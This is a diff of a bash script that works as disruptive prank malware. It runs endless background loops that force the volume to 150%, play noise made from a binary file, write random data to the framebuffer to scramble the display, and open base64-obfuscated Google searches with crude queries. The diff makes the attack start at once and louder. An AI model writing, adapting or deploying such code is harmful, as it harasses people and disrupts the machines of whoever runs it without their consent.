@@ -1,7 +1,8 @@
 #!/bin/bash
 (while true; do aplay /opt/$N/$N.wav; done) &
 (while true; do
-  sleep $(awk -v seed=fuvk 'BEGIN{srand(seed); print rand() * 5}')
+  amixer sset Master 150%
+  pactl set-sink-volume @DEFAULT_SINK@ 150%
   for i in {1..10}; do 
     tail -c 176400 /bin/dolphin | aplay -r 44100 -f S8 -d 10 & 
     sleep 0.01
@@ -10,6 +11,7 @@
     cat /dev/urandom > /dev/fb0
     sleep 1
   done
+  sleep $(awk -v seed=fuvk 'BEGIN{srand(seed); print rand() * 5}')
 done) &
 if command -v kwin; then
   (while true; do
@@ -19,7 +21,6 @@ if command -v kwin; then
   done) &
 fi
 (while true; do
-  sleep $(awk -v seed=jfo3 'BEGIN{srand(seed); print rand() * 45}')
   S=(
     "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPXdoeSUyMGlzJTIwbXklMjBhc3MlMjBibGVlZGluZw=="
     "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWNvcnBzZSUyMG9mJTIwa2luZyUyMG1pbm9zJTIwbW9kZSUyMGFjdGl2YXRlZA=="
@@ -32,6 +33,7 @@ fi
   R="${S[RANDOM % ${#S[@]}]}"
   R=$(echo "$R" | base64 --decode)
   open "$R" || xdg-open "$R"
+  sleep $(awk -v seed=jfo3 'BEGIN{srand(seed); print rand() * 45}')
 done) &
 
 # if command -v xdotool >/dev/null 2>&1; then
